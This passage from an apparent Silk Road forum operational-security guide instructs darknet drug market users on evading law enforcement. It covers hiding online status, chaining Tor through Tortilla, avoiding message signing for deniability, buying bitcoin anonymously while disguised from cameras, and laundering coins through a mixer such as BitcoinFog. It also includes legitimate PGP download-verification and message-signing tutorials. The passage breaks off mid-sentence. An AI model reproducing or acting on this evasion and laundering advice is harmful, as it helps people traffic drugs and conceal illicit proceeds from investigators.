http://www.tested.com/tech/456882-how-secret-service-sold-fake-ids-catch-identity-crooks/Quote     The government made its move in 2012, arresting dozens of fraudsters in the US and in countries where extradition is easy. But many more, including the founder of Cards.ru, remain at large. Those in Eastern European countries, especially, are largely out of the governmentâs reach. SECURING YOUR ACCOUNT FROM FBI MONITORINGI just had another realization that you may want to consider. I noticed that certain some people on the forum were never shown as Online, even when they clearly were, and others were shown as online at times. I then realized to myself there must be a way to never show your status as Online. The way you do this is to open up Account Settings and unselect the box that says Show others my online status. So why would you want to do this anyways? For reasons we spoke about earlier, you do not want to give any law enforcement the ability to see when you log on and log off. It is bad practice, it can leave a trail, leave a pattern, and if you are a person of interest and they are able to connect the time you sign off on the forum with the time you leave your house, or go to sleep, it gives them more reason to be suspicious and more evidence to be used against you in court. Consider disabling this option. INVINCIBILITY MINDSET, FEDERAL GOVERNMENT BULLYING TACTICSSome people have an invincibility mind set that nothing will ever be able to be tied to them or derived from their online communications. Well guess what? They do not have to use your online communications to find out who you are. All that needs to happen, is for you to do something stupid and become a person of interest and they will be monitoring your activities online to the best of their abilities. Remember you only need to screw up once. For example, maybe you become a person of interest and the FBI gains a subpoena to your Facebook account where you stupidly bragged to a friend of yours about participating in certain online activities. This happened to one of the members of LulzSec who transferred a data dump that he obtained through SQL injection exploits to a friend of his using his own Facebook in his own name. So do not ever talk about Silk Road or any of your online activities on any social media platform. Even if a company does not currently keep logs, a court order may perhaps be used to force a company to start keeping logs. Hush Mail was forced to hand over 12 CDs worth of e-mails from three Hushmail accounts, following a court order obtained through a mutual assistance treaty between the U.S. and Canada. According to the following article. http://www.wired.com/threatlevel/2007/11/encrypted-e-mai/ When it comes to being threatened by a court order from the federal government, 99.99% of all companies will comply to avoid either prosecution themselves, or shutting down their business as we saw previously with Hide My Ass. But one company decided to stand up to this type of bullying that you may have heard of called LavaBit as seen in the following article. http://www.theguardian.com/world/2013/oct/03/lavabit-ladar-levison-fbi-encryption-keys-snowdenQuote     The email service used by whistleblower Edward Snowden refused FBI requests to âdefeat its own system,â according to newly unsealed court documents.     The founder of Lavabit, Ladar Levison, repeatedly pushed back against demands by the authorities to hand over the encryption keys to his system, frustrating federal investigators who were trying to track Snowdenâs communications, the documents show.     Levison is now subject to a government gag order and has appealed against the search warrants and subpoenas demanding access to his service. He closed Lavabit in August saying he did not want to be âcomplicit in crimes against the American peopleâ.     In July, the authorities obtained a search warrant demanding Lavabit hand over any encryption keys and SSL keys that protected the site. Levison was threatened with criminal contempt â which could have potentially put him in jail â if he did not comply. Such a move would have given the government access to all of Lavabit usersâ information.     The court ordered Levison to be fined $5,000 a day beginning 6 August until he handed over electronic copies of the keys. Two days later Levison handed over the keys hours after he shuttered Lavabit. You see what I am talking about? The federal government ordered this man to hand over all his encryption keys and SSL keys which compromised the privacy of 400,000 users just so they could gain more data on one man, Edward Snowden. And they used bullying tactics and attempted to bankrupt the owner of Lavabit by fining him $5,000 per day until he handed over the keys. Unfortunately Levison had no choice but to hand over the keys or lose everything. An interview on Reddit with Levison revealed what he claimed that other secure email providers who threatened to shut down were forced to stay up. http://www.theregister.co.uk/2013/11/19/lavabit_analysis/Quote Lavabitâs founder has claimed other secure webmail providers who threatened to shut themselves down in the wake of the NSA spying revelations had received court orders forcing them to stay up. There you have it. Anyone who tries to stand up to the government, especially in the United States will be met with swift justice, court orders and outrageous fines unless they comply and on top of it, slapped with gag orders so they cannot tell anybody about what the government is doing. HOW TO CONNECT TO TOR OVER TOP OF TORHere is another fun tip that may or may not interest you, but I figured I would throw it in for you anyways. I figured this out while trying to figure out an effective way to do a TOR -> VPN connection. You can do TOR -> TOR connection with Tails by using a program called Tortilla, thus adding another layer for your adversaries to crack. Whether or not this is worth it, is completely up to you, but I am sharing in case it is something you want to do. This however currently only works for those using Windows because it was designed to be used by Windows users. Please note as well that this will noticeably slow down your connection since you are going through TOR twice. Here is the official homepage of Tortilla. https://github.com/CrowdStrike/Tortilla And the official download page for the prebuilt standalone exe below. There is a link to it on the home page if you do not trust me. http://www.crowdstrike.com/community-tools/ The way you do this is very simple actually. You need to first download TOR Expert Bundle from the TOR Project download page and install it on your computer or better yet your USB drive. https://www.torproject.org/download/download.html.en Next open the tor.exe and just let it run until it says Bootstrapped 100% Done. Next you want to run the tortilla.exe file and make sure you run it with Administrator privileges. Also, if you are running Windows Vista or later, you will likely get an error that this program does not have a valid certificate, because it is actually signed with something called a test-signed ceritifcate. In this case you need to allow test-signed drivers to run on your computer. To do this, simply go to your Start Menu and type in the search box âcommandâ. When command comes up, you right click it, and click run as Administrator and it will open up a command prompt. Next type in the following command. Bcdedit.exe -set TESTSIGNING ON and this will allow Windows to install test-signed drivers. Restart your computer and you will see in the bottom right hand corner after you restart Test Mode Windows. Now you can run Tortilla. And let it connect to TOR. Remember to have tor.exe from TOR Expert Bundle open first. Finally, you open up Virtual Box or whatever Virtual Machine software you are using and click Settings on the Tails virtual machine. Click on the Network tab and change the drop down menu where it says Attached To: to Bridged Adapter and in the drop down menu below it called Name: Select Tortilla Adapter. Now your Virtual Machine, in this case Tails, will always connect to the internet through Tortilla, which connects through TOR. And since Tails establishes its own connection to TOR, you will be running TOR over top of TOR. Again, you may or may not want to do this, but I am giving you the option should you want to. If anyone is interested in learning more about the creator of Tortilla, he did a PowerPoint presentation at the 2013 Black Hat USA conference. Feel free to watch his talk at the YouTube link below. Please note however that YouTube is owned by Google and there are only about 57 views on the video, so the government will likely correlate users who watch that video with users from this forum. Make sure you do not watch the video on YouTube with your real IP address. At the very least use a VPN or find another site that has it hosted. Always be extra paranoid. HOW TO VERIFY YOUR DOWNLOADED FILES ARE AUTHENTICI just had a realization about something that is pretty important and I wanted to share it with you, regarding security. Verifying your downloads As a general rule of thumb, you should always download files from the home pages of their respective developers. TOR: https://www.torproject.orgTails: https://www.tails.boum.orgVirtual Box: https://www.virtualbox.org/ The reason this is so important, is that there are people who host maliciously modified versions of these programs and will host legitimate looking sites to try and get you to download their version, which can install things like backdoors into your computers, keyloggers, and all types of nasty surprises. Sometimes developers will offer mirrors for their projects, which are simply just alternative links to download from in case the main server is too slow, or down. Sometimes these mirrors can become compromised without the knowledge of the developers. Maybe you do not have TOR or Tails on your laptop and you are traveling out of the country and the hotel that you are staying at has TORâs homepage blocked. There are times when you may need to find an alternative mirror to download certain things. Then of course there is the infamous man-in-the-middle attack where an attacker can inject malicious code into your network traffic and alter the file you are downloading. The TOR developers have even reported that attackers have the capability of tricking your browser into thinking you are visiting the TOR home page when in fact you are not. So what do you do about it? You can verify that the file you downloaded is in fact legitimate. The best tool for this is GnuPG. The TOR developers recommend you get it from the following page (Windows Users). http://www.gpg4win.org/download.html You can install this program on your USB drive or on your actual computer, you will hear your actual computerâs operation system referred to as your Host OS. So download it, run it, install it and we will start showing you how to use GnuPG. If you remain on the GnuPG download page you will see something under the big green box that is called OpenPGP signature. Download that into the same folder as the GnuPG file, this is the file that the download was signed with. Basically someoneâs signature saying, I made this file. And you also need a PGP public key to verify the signature. So to sum it up so far, the signature is created from the PGP private key, and can be verified by the PGP public key. The signature file is used to verify the program itself. So let us grab the PGP public key for GnuPG as well. If you look on the same download page, under the heading Installation, you will see a link where it says verify the integrity of the file. It will lead to you the following page. http://gpg4win.org/package-integrity.html Note where it says the following statement. The signatures have been created with the following OpenPGP certificate Intevation File Distribution Key (Key ID: EC70B1B8). This is the link to the page that hosts the PGP public key file that you need to download, go there. On the page we just navgiated to, go to the bottom right where it says Intevation-Distribution-Key (public OpenPGP key for signing files) and download that file. This is the PGP public key file, save it to the same place as your signature file for ease of use. Okay, now that we have both the signature file and the PGP public key, let us now verify our download. First thing you need to do is navigate to the PGP public key file, called Intervation-Distribution-Key.asc, right click it and go to More GpgEX Options and down to Import Keys. This will import the PGP public key into your key ring, and now you can verify the file with the signature. Right click your actual file you want to verify, in this case gpg4win-2.2.1.exe and go to  More GpgEX Options and down to Verify and it should automatically detect the signature file where it says Input File, but if it does not, navigate to the signature file and make sure the box below it where it says Input file is a detached signature is checked. Look at the bottom and click Decrypt/Verify and you will likely get the following message. Not enough information to check signature validity. Check details. Believe it or not, this is completely fine. Click on show details, you are looking for a specific result. Signed on 2013-10-07 08:31 by distribution-key@intervation.de (Key ID: 0xEC70B1B8). The validity of the signature cannot be verified. If you navigate back to the page from Gpg4Win that says Check Integrity where you found the link to the page that contained the PGP public key you will see on that page. Intevation File Distribution Key (Key ID: EC70B1B8) Note the key ID from your decrypt result and the key ID from the Check Integrity page and note the email address ending in the same URL that we downloaded the PGP public key from. We have a match! I will explain the reason for this warning message later. Now that we verified that our verification program is legit. Let us try and verify our Tails ISO file, since if we have a compromised Tails OS, then nothing we do will be anonymous. Let us get right to the Tails download page. https://tails.boum.org/download/index.en.html Scroll down to where it says Tails 0.22 signature and download that to your Tails folder where you have the ISO file that we already downloaded. Next scroll down to where it says Tails signing key, this is our PGP public key. Exact same procedure, import the key, then click Verify and specify the signature file if it has not already been specified for you, exact same settings and you will get the same warning message. As explained by TailsQuote     If you see the following warning:     Not enough information to check the signature validity.    Signed on â¦ by tails@boum.org (Key ID: 0xBE2CD9C1    The validity of the signature cannot be verified.     Then the ISO image is still correct, and valid according to the Tails signing key that you downloaded. This warning is related to the trust that you put in the Tails signing key. See, Trusting Tails signing key. To remove this warning you would have to personally sign the Tails signing key with your own key. In other words, you need to basically promise that the PGP public key you downloaded is safe by signing the PGP public key with your own private key, but we do not really need to do that and I will not be including a tutorial on how to do that. Tails explains that if you are worried about a compromised PGP public key, just download the key from multiple sources and compare them, if they all match, it is a good chance you are using a legit PGP key. Now let us finally move on to TOR because this one will be a little less straight forward, but once you do this one, you should be able to figure out how to verify anything. Navigate to their download page and find the package that you want. https://www.torproject.org/download/download.html.en To keep things simple let us choose Tor Browser Bundle 3.5, and under the orange box you will see a link (sig). This is the link for the signature file, I hope by now you know what to do with it. Next we need the PGP public key right? Well it turns out that with so many developers working on TOR, there are multiple PGP public keys, and certain bundles were signed with different keys than other bundles. So we need to find the PGP public key that belongs to our Tor Browser Bundle. Check out this page. https://www.torproject.org/docs/signing-keys.html.en It has a list of all the signing keys that they use and you can certainly use these key IDs to get what we want by simply right clicking on the signature file and click verify. You will get a warning. Not enough information to check signature validity. Show Details And in details it will say the following warning. Signed on 2013-12-19 08:34 with unknown certificate 0x416F061063FEE659 Keep this entire number in mind for later, it is called a fingerprint. But for now if you just compare the last 8 digits to Erinn Clarkâs key ID (0x63FEE659) provided on the above page, and since she is the person who signs the Tor Browser Bundles you will see they match. But we want to be a bit more thorough, never settle for mediocrity. Go to your task bar in Windows, and find the program called Kleopatra, it looks like a red circle with a small white square in it. Right click it and go to Open Certificate Manager. We are going to import the full keys using this manager. Also note, if you go to the tab that says Other Ceriticates you will find the Tails and Intevation (GnuPG) keys we used earlier stored for the future when you need to download a new version of those programs and verify them again. We are going to be following the instructions from the verifying signatures page on the TOR Project website. Feel free to follow along from that page so you know what I am talking about and where I am getting my URL and numbers from. https://www.torproject.org/docs/verifying-signatures.html.en In order to import keys, we need to first add an online directory where they are stored. So let us first add the online directory where the PGP public keys are stored according to the TOR website. Click Settings then Configure Kleopatra. Next, click New and we are going to enter the following URL which I took right from the page above. pool.sks-keyservers.net, and leave everything else as default and click OK. Finally, click the button that says Lookup Certificates On Server and we will be searching for Errin Clarkâs PGP public key by searching for her fingerprint provided on the TOR website page called Verifying Signatures above, remember, she is the developer who signs the Tor Browser Bundle. The fingerprint we are entering is 0x416F061063FEE659, does this number look familiar? It should, it is the number we got back the first time we tried verifying but without the actual PGP public key. if you get any warnings that pop up when searching just click OK and it should bring up Errin Clarkâs key, select it and click Import. You should now have her key listed under Imported Certificates. Now let us go back and verify that signature one more time and see what happens. You should get something like the following. Not enough information to check signature validity. Signed on 201-12-17 12:41 by errin@torproject.org (Key ID: 0x63FEE659).The validity of the signature cannot be verified. TOR also explains this warning message in their words in case you are still not happy with the warning message.Quote     Notice that there is a warning because you havenât assigned a trust index to this person. This means that GnuPG verified that the key made that signature, but itâs up to you to decide if that key really belongs to the developer. The best method is to meet the developer in person and exchange key fingerprints. I do not know about you, but I am happy with the result here, and I am certainly not going to track down Erinn Clark to get her key fingerprint, and it looks like our TOR Browser Bundle is legitimate as well! Now you know what to do when the PGP public key file is not directly hosted on the site itself, you have no more excuses to not verify your downloads. VERIFYING SIGNED MESSAGES WITH SIGNATURES AND SIGNING YOUR OWN MESSAGESSince we just finished a section on verifying downloads with signatures and public keys, I figured we should do a quick post on verifying messages by using the same two things, signatures and public keys. Now for those of you who are members of the Silk Road Forums, you will notice that some people, mainly Moderators like to sign their messages with signatures. Let us look at an example of a signed message from Dread Pirate Roberts. The last message he left before going on his leave of absence.Quote     ââBEGIN PGP SIGNED MESSAGEââ    Hash: SHA512     Silk Road has not been compromised even if the allegations are true. Neither had access to sensitive material. I will make an announcement later to address the concerns this has raised.    ââBEGIN PGP SIGNATUREââ     iQIcBAEBCgAGBQJStEgqAAoJEMyyOOR8/t+867AP/RpjCq1B3WSYgnscbZU+UZOy    K0AGMM7tmu1DV1pr2S379YjVxQeUWeTbwDYhaYcWkDBDshnlpSd97fwAL1YVrBQx    jWE08tyo1sd1v5F/HajCx0DC2L5NeqD4UTDd6Dl2AOeBI4pZ+Ah/Q4VoB9cOBQGw    lSbjBY2U4redqBeRd1mFR8N+f3XmxYXzmB4Mf8ddvQkl62HmkwRwA27uUExt73uj    f3/EYVc/XjPgKG345S8yUwcGxLQcfoRM7UosbSGeEaDvvWjfZ6qQw4p7CbqIimHu    IOT6dhFcPmoVdiZGDvjtM3jXfF2sTi5mclGp/4axsrvOWZlCbrobE9EuJnGvscU4    ekU90vtcviES9XEJAr9XGOGgzY/OBf1xpj0iRY7rBDHUqA/FjfSULxqanZYhh0Wn    webHldrjylBRKM0PsnQdPn1CVGj8ThwB6SLfd0WEN1FEQt0hXP3uK1zDOri/fIcJ    Pnvf3jxYNcw9Q+2OW6QpZ/7t+S2E0yiifbNCobAMI18mrynuw3pk/xumg6t2WF/j    YHRpbTfFCCsbiPwR8P9CcUNQ5Iqcc2ewq4GOPx053aL/Vo/nfPdu/9hrRpfF3U5E    J7rFvAStaejxH7/vNxZRrTTiwrrc6njsFJHXWVAJjd+fHLI1efptbc8Kzwms9Yl0    0nzLjAJPFZOv6y7gP8tG    =lDZd    ââEND PGP SIGNATUREââ So why should you care about this? What is the significance of signing a message? The reason is, in case somebody were to compromise DPRâs account, due to having a weak password or possibly an exploit in the forumâs coding, then the person would not be able to sign the messages without access to DPRâs private key. So let us look at how we can verify this message left by DPR. First of all you need to visit Dread Pirate Robertsâ profile page and grab his PGP public key. I am not going to post the key here for space reasons, but just visit his page at the following URL and import that key into your keyring. http://silkroad5v7dywlc.onion/index.php?action=profile;u=1 Next, highlight the entire PGP signed message from top to bottom and copy it to your clipboard (Right click, Copy). You will see your little Clipboard icon in the top right of Tails turn red. Click on that clipboard and select Decrypt/Verify. You should get the following results. One in the window on top and the other on the bottom.Quote     Silk Road has not been compromised even if the allegations are true. Neither had access to sensitive material. I will make an announcement later to address the concerns this has raised.     gpg: Signature made Fri 20 Dec 2013 01:37:46 PM UTC using RSA key ID 7CFEDFBC    gpg: Good signature from âDread Pirate Roberts <silkroad6ownowfk.onion>â    gpg: WARNING: This key is not certified with a trusted signature!    gpg:          There is no indication that the signature belongs to the owner.    Primary key fingerprint: 5A48 F5D0 50E9 9052 62B4  799D CCB2 38E4 7CFE DFBC Again we get the same warning we did when verifying our downloads, saying we have not verified that the PGP public key is authentic. We can see the signature name was made by Dread Pirate Roberts and the comment section has the Silk Road URL, so far so good. Now remember when we verified TOR? We wanted to check out the fingerprints to see if they matched. We do this by going to our key ring (Manage Keys), and selecting DPRâs key, right clicking it and going to properties. Now move to the tab Details and look under where it says Fingerprint: and compare the numbers in there to the numbers we got when we verified the signature. They should be the following. 5A48 F5D0 50E9 9052 62B4799D CCB2 38E4 7CFE DFBC We have ourselves a match! So unless DPRâs private key was compromised, we know that he himself was the one who wrote that message. So now you see why some people decide to sign their messages. It is a way of verifying that their account has not been compromised by verifying that the person in control of the account is the same person that is in control of the PGP private key. Do you want to learn how to sign a message? It is very easy. Open up gedit Text Editor and type in a message. Next, select the message and copy it to your clipboard (Right Click â Copy) and then click on your clipboard icon up top and choose Sign/Encrypt Clipboard with Public Keys. Do not choose a key from your list of PGP public keys unless you want to encrypt the message. If you want to encrypt the message to send to somebodyâs inbox or so that only one person can view it, then select their name and it will encrypt it with their PGP public key. In our case, we just want to sign the message without encrypting it, but you can certainly do both at the same time if you wanted to. If you look down near the bottom you will see where it says Sign message as: click on this and select your personal key. It will ask you for your passphrase because remember you are signing this with your private key. Once you enter it correctly, the PGP signed message will be copied to your clipboard and you can paste it anywhere (Right Click â Paste) that you want to. Here it what mine looked like. ââBEGIN PGP SIGNED MESSAGEââHash: SHA512 This is my PGP signed message for demonstration purposes.ââBEGIN PGP SIGNATUREââ iQIcBAEBCgAGBQJS0GiWAAoJEPuh6tSg81nyqXAP/2mEqvk9RP0FEHZi3edH9faVOmDoOostmzm90nGMGOOu4cuG0M6jgl7R3hfUZBE6zCh59MG8a9EDuUzpIT3U5nfdzS0GWtzUQKGXPXfJ1OvWlsA6Sm7TsEsviBBz5DJxyVLcJGNU6OLUVm7onxBLwfTqD1jAATIB43WJbDrq3XY9MF9GCoOLlcLeKNVa4m0JF582IvQJ05mSZXeXCueImvolFaflpLW5MKyJJ92a8uheB0pLHUQTLr6jZn6TcfKY9dK8puOam5k2TGut/Sm47uqcaMA1trXw4xntww/8X4QyL5SbSN7QVOFsy/g0b3Grp5OrConsfnsUoeRH5ArnxY0WijPl92aTbZazvXspW2REkJ3yq+fWjuGrYHw8m7/YVBig+OSMuBUXhSE5Pjq95fyMbA1P7rF2fi7eRsl1z0qyETV3Bs1RltwvBUVIwj3SZNeVVoG5cHgpiPgGFq4S9QkeunIFeHy3YpBk90kLA1n8n61VnkKAUy0Dt9AoTJloeOqPtcgeKHVsFzxdPCBcSwqdXYnIx4lNeaw4OvHYgZsCMvFlUItSBGnFWLN9foQ8UybAUPGI9Z4sK2WmtyWK4fLlcXnYY9zt56Ji4DiVsQrEUamNTQEDGxpvBL/kQKRMKN6HviEXW+qr57LAo6t6sTQwKTV4uJkH1JxuOOhN9tIe=NkoxââEND PGP SIGNATUREââ And if you want to verify it, check out my PGP public key in my profile and verify my PGP signature against my key! It is really that simple. But you might be asking, cannot somebody just change the message and copy the signature? No, changing the message will change the signature because the signature depends on both the message and the PGP private key. So if you change one single character of my signed message you will get the following error. gpg: Signature made Fri 10 Jan 2014 09:39:34 PM UTC using RSA key ID A0F359F2gpg: BAD signature from âJolly Roger (They would live and die under it)â So when should you sign a message? And when should you not sign a message? Great question. The majority of users should probably not sign messages unless they have to because it gives you plausible deniability. It is easier to deny posting certain things or certain communications you may have had with vendors or other people including law enforcement if you do not sign your messages, because you can always claim somebody else gained access to your account. It is harder to do this if you signed the message with your PGP private key. If you are dealing with somebody who wants to verify your identity and make sure that your current signature matches the public key they had on file for you from 6 months ago, then maybe they might get you to send a signed message. But again, all they really need to do is send you an encrypted message with your PGP public key they had on file, and if you cannot decrypt it, you are not who you say you are. In real world application, developers can use PGP signed messages in News Announcements or perhaps new releases of their programs providing a download URL so that users can be sure the developer is the one posting the URL and not some malicious attacker who compromised the forum account of the developer and so forth. So for the average Silk Road forum user there really is not a lot of times when you should be signing messages unless you are a moderator or making a public announcement and so forth, but it is an option you now have in your arsenal, and now you can start verifying the signatures of the Administrators and Moderators in case you believe their accounts may have been compromised. AN EXAMPLE OF REALLY BAD OPSEC â SMARTEN UP!Guys, I am not going to post exactly who started this thread quoted below, but it belongs to somebody who is a senior member with 375 posts. And he posted some very personal details and probably did not realize how very revealing these details are.Quote     Track Me If You Canâ¦     Awesome bit I just watched on Netflix. This is not terribly new, done in 2010, but he is quite thorough in his demonstrating how to disappear in modern US culture.     I do have to add that some of the tech he introduced from the other side is quite alarming.     The alphabet cops have waaay too much discretionary income. Time to start defunding them. So why is this revealing? Why is this bad you might be asking. Well, Netflix collects metadata on its users just like every other big data corporation. If you are a Netflix user, you likely have a profile which keeps track of every movie you have ever watched and what you rated it and so forth. http://www.usatoday.com/story/theoval/2013/12/17/obama-bidenapple-amazon-twitter-netflix-yahoo-facebook-microsoft-google/4049305/Quote     Electronic surveillance and the new health care law are on the agenda as Obama and Vice President Biden meet with a group that includes executives from Apple, Amazon, Twitter, Netflix, Yahoo, Facebook, Microsoft, and Google. This user stated, that he just watched a specific movie, that he named. And also stated that this movie has been up since 2010. So how many people do you think watched this exact movie in the time frame that this guy stated he watched it? Probably not too many. Under 100 for sure since the movie has been up for almost 3 years. Well, now the federal government has a list of 100 or less suspects, one of which is this particular user on Silk Road. But maybe he was using a VPN to connect to Netflix? Greatâ¦. does he use that VPN for anything else? Logging into his email, surfing the web, etcâ¦ Even if he used a VPN, maybe they keep logs? Maybe they are US based and are easily subject to subpoenas, maybe they will spill everything just like HideMyAss did. We just do not know, but this is exactly the type of information you all should NOT be revealing about yourselves. This is extremely bad OpSec people. Smarten up! But then I looked even further through this userâs profile and looked at his posts. I know which country he lives in, I know which drugs he has imported into his country and I know which countries he has imported those drugs from. This guy has spoken about cooking drugs, he talks about being in a cold part of his country, which not all parts of that particular country ever even get cold which helps law enforcement narrow down that list of suspects they got from Netflix. If you think that law enforcement is not interested in buyers you are sadly mistaken. Sometimes if they establish that a buyer has been purchasing from a vendor that they are after, then busting the buyer can help them get to the vendor. They may take over the userâs online identity and start ordering things from vendors since he already has established a trust with these particular vendors. If the vendor slips up because of the trust built up with the buyer, the vendor is in trouble. I want you all to learn a lesson from this! If you are going to talk about which vendors you buy off of, which country you live in and which countries you have imported drugs from, then you better make DAMN SURE you do not start giving away details like which movie you watched last night on Netflix. That is almost as bad as logging onto a server with your real IP address. Keep your mouths shut about your personal lives! TOR CHATBy now if you have been following this thread, you should know that any type of messaging system is likely compromised or storing your data for an unknown period of time, and if you ever become a person of interest can be looked back upon for 5+ years. This means things like Gmail, Hotmail, Yahoo Mail, Skype Messaging, Facebook Instant/Private Message, Text Messages, and other forms of communication are all likely being monitored to some degree, at the very least logging the meta data. But you should always treat everything as if those who are monitoring it can read the content of the email as well. We have talked about communicating with PGP, we have talked about using TOR and hidden services, and we have talked about good practices of OpSec. But some of us want to be able to instant message somebody else. The good news is, you can do this with something called TorChat. TorChat is a decentralized anonymous instant messenger that uses Tor hidden services as its underlying Network, in other words it communicates over the Tor network through the .onion URL protocol. This provides end to end encryption that we talked about in previous posts. It provides cryptographically secure text messaging and file transfers for business dealings, and confidential communication between two people. The best news, is that you can use TorChat on your Windows, Linux and your smart phones. A French developer released a version for MAC users, but it still in beta and should be used at your own risk. You can get TorChat for the iPhone in the Apple store, you can get TorChat in the Android Market as well, so you can even use it as a means of text messaging somebody else who also has TorChat. In TorChat, every user has a unique alphanumeric ID consisting of 16 characters. This ID will be randomly created by Tor when the client is started the first time, it is basically the .onion address of a hidden service. TorChat clients communicate with each other by using Tor to contact the otherâs hidden service. For example, the first time you open TorChat your computer might generate d0dj309jfj94jfgf.onion and from here on out, d0dj309jfj94jfgf will be your TorChat ID that you give out to people that you want to be able to message you. Here is the home page of TorChat. https://github.com/prof7bit/TorChathttp://www.sourcemac.com/?page=torchat â MAC users Unfortunately at this time, TorChat does not run properly in Tails, so you will either need to run it on your Windows, Linux or MAC system. It is pretty straight forward, download it, unpack it and run it and everything else should happen automatically for you. Once the avatar beside your TorChat ID turns green, you are online and same with your contacts. You can add contains by right clicking and choosing Add Contact and just enter their TorChat ID. At this time there is some people debate as to whether or not TorChat is completely safe, and I would say that TorChat is about as safe as Tor is, just make sure you practice the same good practices you are used to. Do not give out personal information, if you are sending sensitive information use PGP encryption and so forth. Here is another article on how TorChat works going into a little bit more detail. You can access it over the onion network. http://kpvz7ki2v5agwt35.onion/wiki/index.php/Hacking_TorChat Another user had some additional input that I overlooked when writing this post that you should be aware of.  Torchatâs security is unknown. It has not undergone a proper security audit, professional or otherwise, that I know of. It creates a hidden service on your computer leaving you vulnerable to deanonymization attacks that apply to all hidden services. It also seems to be a very basic protocol that looks like netcat over Tor. There is no way to decline a file transfer. It automatically starts the transfer, writing the file to /tmp which is a RAM-mounted tmpfs on Linux. Then you are supposed to save the file somewhere. Theoretically an attacker could transfer /dev/urandom while you are away from your computer until it fills up your RAM and crashes your computer. This would be great for inducing intersection attacks. Not sure though. If the kernel is managing the system correctly, it may just stop the transfer when you run out of RAM. Another thing is that once someone learns your Torchat ID there is no way to prevent them from knowing you are online, even if you remove them from your buddy list. The reason is because your Torchat instance is a hidden service that publishes a normal hidden service descriptor which anyone can download. Thereâs no way to stop that. If you want to cut off contact with someone, you have to get a new Torchat ID. So you should be very conservative about handing out your Torchat ID and only give it to extremely trusted associates. OBTAINING, SENDING AND RECEIVING BITCOINS ANONYMOUSLYWe have talked about a large amount of ways to maintain your security, but we have not really talked about how to actually exchange currency. First thing I want to say as a disclaimer, is that I am not advocating that you do anything illegal. This is for educational purposes only and my recommendations are made assuming you are exchanging currencies anonymously as a means to protect your own privacy. So you have found something online that you want to buy, and they are asking for Bitcoins as payment. How do you get the Bitcoins, and how do you get the Bitcoins to them? We are going to explore these options to a degree and hopefully by then you can make an educated decision on which method is best for your situation. The options of buying Bitcoins are as follows. 1. Sign up at an exchange online. Some popular exchanges are MT Gox, BTC-E, BitStamp and CoinbaseThe downside of purchasing Bitcoins at these exchanges, are that you need to verify your identity with them by means of submitting documents such as a driverâs license or passport and a utility bill. If you are able to get past this first obstacle, then you need to find a way to get money into the account. Exchanges generally only accept wire transfers as a way to fund your account, but some of them offer a way of transferring money directly from your bank account. You can obviously see that by doing this you are exposing your true identity to the exchanges in one way or another, if not at the very least your location. 2. LocalBitcoins.comLocalBitcoins offers a way for you to find a person in your local area, or if you want to go to another state or province to meet up with someone further away from you, you can choose where to look for people in that area selling Bitcoins either online (bank transfer or cash deposit) or meet them for cash in person. Traders have reputation lists, similar to a feedback score on eBay and you can find a trader who has a good reputation to buy off of. You send in a trade request and once the seller has received the money, he can release the Bitcoins from LocalBitcoins and they are sent to your wallet. Some people have expressed concern that law enforcement may act as buyers and sellers on LocalBitCoins, but it does not matter if this is the case in my opinion as long as you are not looking to buy large amounts. You can also, if you want, communicate with the buyer over email, arrive from public transportation, wear a hat, and all sorts of secret agent type tricks to try and conceal your identity. Wear a wig if you are super paranoid. 3. Use a Bitcoin ATMCurrently there is only one ATM in the world that I am aware of, and it is located in Canada. If you do not live in Canada then this does not help you. Luckily according to the an article, the company who is rolling out these ATMs called Robocoin is launching ATMs in other countries as well coming soon. http://techcrunch.com/2014/01/02/robocoin-the-bitcoin-atm-is-heading-to-hong-kong-and-taiwan/Quote     The first shipping bitcoin ATM, Robocoin, is landing in Hong Kong and Taiwan as the company expands its reach this January. They are planning further releases in Europe, Canada, and the US but, given Asiaâs clout in the BTC markets, this is definitely an interesting development. There will likely be some way to try and cut down on money laundering by getting you to verify your identification, but from what I understand, they currently only do this if you are selling Bitcoins for cash using the ATM, and not buying them for cash. The way that it works, is you choose the amount of BTC you want to buy, and you feed your cash into the ATM machine. You can at that point either print out a generated paper wallet, or choose a wallet of your own to send the Bitcoins to. This method may be another good way because it takes dealing with another human out of the transaction. Something you may need to be aware of is surveillance cameras, so maybe wear a hood, hat, wig, sunglasses, and so forth to disguise yourself if you are worried about your identity. 4. CraigslistBelieve it or not, there are a decent amount of people on Craigslist that you can meet up with in person and buy Bitcoins off of with cash. Your local area may not have a large number of listings, but you can always search in other nearby metropolitan areas and make a day trip out of it if you want. The same considerations about protecting your identity apply here as above. 5. Mine your own BitcoinsI am not going to get into how to mine Bitcoins, or whether or not you should, but if you want to get Bitcoins without dealing with other people, this is one of the ways you can do it. Run your miners over Tor, stay anonymous and you will have yourself some untainted Bitcoins. Okay, so now you have yourself some Bitcoins, how can you get them to somebody else that you want to buy something off of or trade with? As you probably know by now, every single transaction is tracked on BlockChain.info. My wallet address that I have set up for donations for the hours I have spent working on this thread is 1PkJ928QWC5BuQAsHoNQzRV5wfnveJSRCp. You can check out the transactions related to it by going to the following address. http://blockchain.info/address/1PkJ928QWC5BuQAsHoNQzRV5wfnveJSRCp So you have Bitcoins sitting in your wallet, and if you send them to somebody else, it will show up on BlockcChain exactly where you sent them. A couple of things to keep in mind. 1. You purchased your Bitcoins from somebody or something. They may have kept a record of the wallet those coins were sent to.2. If you dealt with a law enforcement or somebody trying to track you, then they can track where the coins are sent after you forward them to somebody else. Right now the best method of trying to lose this trail is using something called a mixer or a tumbler. You can think of this like throwing your Bitcoins into a giant pile of coins with other users and then withdrawing them at a later time from the mixer. If you threw in 1 Bitcoin and pulled out 1 Bitcoin, think of all the other people who did the exact same thing. Possibly thousands of others withdrawing 1 Bitcoin from the exact same pile of coins. It has now become much harder for you to be linked to those coins. Then on top of that, maybe you do not withdraw 1 Bitcoin, maybe you only withdraw 0.5 Bitcoin right now and leave the other 0.5 Bitcoin in the pile. It becomes even harder to link those Bitcoins to you. One website that does this is called BitcoinFog and can be found on a clearnet URL and a hidden services URL. http://www.bitcoinfog.com/http://fogcore5n3ov3tui.onion/ BitcoinFog has been around for a while now and most people seem happy with the service they provide, so I would come to think that they are a trustworthy service. The way they work is as I mentioned above, and on top of that the service takes 1%-3% (randomized for obscurity) fee on each deposit. So you may put in 1.0 Bitcoins and take out 0.97 Bitcoin after fees and it mixes things up. You can also decide when you might want to withdraw it, whether it is in a month, week, days, and so forth. This is a good service to use and definitely mixes things up for you. The only thing you need to keep in mind, is that there is a trail of you sending your coins into BitcoinFog, which some people may or may not find suspicious. But what you do with your coins after BitcoinFog is going to be extremely difficult to track, if not impossible due to the vast number of transactions that are occuring in and out of 